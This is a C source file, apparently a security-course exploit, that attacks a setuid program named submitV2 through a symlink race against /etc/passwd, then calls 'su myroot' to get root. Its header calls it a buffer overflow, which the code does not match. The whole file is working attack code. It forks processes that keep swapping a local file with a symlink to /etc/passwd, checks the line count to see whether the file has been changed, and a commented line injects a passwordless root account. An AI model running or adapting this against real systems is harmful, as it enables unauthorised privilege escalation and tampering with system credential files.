/*
 * sploit1.c
 * buffer overflow version, attack the check_for_viruses function
 */


#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <string.h>
#include <sys/stat.h>
#include <sys/time.h>

#define TARGET "/usr/local/bin/submitV2" // or submitV2
//#define TARGET "/share/submit"   // for testing only




int getlength(){
	int lines = 0;
	int ch = 0;
	FILE *f = fopen("/etc/passwd", "r");
	if (f == NULL) return 0;
	while ((ch = fgetc(f)) != EOF) {
		if (ch == '\n') lines++;
	}
	fclose(f);
	return lines;
}


void exe()
{
	
	char *args[4];
	char *env[1];

    //system("echo 'newroot::0:0:root:/root:/bin/bash' >> passwd");
	
    
	//symlink("/etc/passwd", "passwd");
	args[0] = TARGET;
	args[1] = "././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././passwd"; 
    args[2] = NULL;
    args[3] = NULL;

	env[0] = NULL;

	//execve(TARGET, args, env);
	system("/usr/local/bin/submitV2 ././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././passwd 2> /dev/null");
    //fprintf(stderr, "execve failed\n");
}

int main() {
    int pid;
	//int i = 0;
	//int j = 0;
	int currentlength = 0;
	int count = 5;
	struct timeval stop, start;
	gettimeofday(&start, NULL);
	//do stuff
	


	remove("passwd");
	system("./gen 2> /dev/null");

	symlink("/etc/passwd", "passwd");
	
	while (count > 0) {
		pid = fork();
		if (pid == 0) {
				gettimeofday(&stop, NULL);
				printf("loc 1 %lu\n", stop.tv_usec - start.tv_usec);

				usleep((rand()%10 + 1) * 5000);

				gettimeofday(&stop, NULL);
				printf("loc 2 %lu\n", stop.tv_usec - start.tv_usec);

				remove("passwd");
				symlink("/etc/passwd", "passwd");
				return 0;
		} else {
				remove("passwd");
				system("./gen 2> /dev/null");

				gettimeofday(&stop, NULL);
				printf("loc 3 %lu\n", stop.tv_usec - start.tv_usec);


				system("/usr/local/bin/submitV2 ././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././././passwd 2> /dev/null");
				
				gettimeofday(&stop, NULL);
				printf("loc 4 %lu\n", stop.tv_usec - start.tv_usec);
				remove("passwd");
		}
		currentlength = getlength();
		if (currentlength != 22){
			break;
		}else{
			count--;
		}
	}
    

	
	system("su myroot");
	return 0;
}
